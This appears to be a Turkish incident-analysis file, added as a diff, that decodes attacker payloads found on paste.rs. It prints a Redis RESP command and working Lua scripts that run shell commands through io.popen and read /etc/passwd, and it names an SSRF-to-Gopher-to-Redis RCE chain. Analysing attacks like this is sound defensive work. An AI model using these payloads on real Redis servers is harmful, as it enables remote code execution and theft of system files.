@@ -1,0 +1,25 @@
+SALDIRGAN PAYLOAD ANALİZİ — 29 Nisan 2026
+============================================================
+
+1. paste.rs/fKz6Y — Redis GET komutu:
+   Decoded: *2
+$3
+GET
+$5
+paths
+   Amaç: Redis'ten 'paths' key'ini oku
+
+2. paste.rs/nw42g — Redis Lua RCE:
+   Lua kodu: local h=io.popen('find /tmp -name "pattern_*" -mmin -5 2>/dev/null') local r=h:read('*a') h:close() local h2=io.popen('find /app -name "pattern_*" -mmin -5 2>/dev/null') local r2=h2:read('*a') h2:close() local h3=io.popen('ls -la /tmp/*.tiff /tmp/*.pdf 2>/dev/null') local r3=h3:read('*a') h3:close() redis.call('SET','paths',r..r2..r3) return r..r2..r3
+   Çalıştırılan shell komutları:
+     find /tmp -name 'pattern_*' -mmin -5
+     find /app -name 'pattern_*' -mmin -5
+     ls -la /tmp/*.tiff /tmp/*.pdf
+   Amaç: Sunucuda dosya arama + listeleme (RCE)
+
+3. paste.rs/HatgR — Redis Lua /etc/passwd:
+   Lua kodu: local f=io.open('/etc/passwd','r') local c=f:read(50) f:close() redis.call('SET','x',c) return c
+   Amaç: /etc/passwd dosyasını oku, Redis'e kaydet
+
+SONUÇ: Bu payload'lar SSRF → Gopher → Redis → Lua → RCE zinciri kullanmaktadır.
+Saldırgan sunucuda shell komutu çalıştırmayı hedeflemektedir.
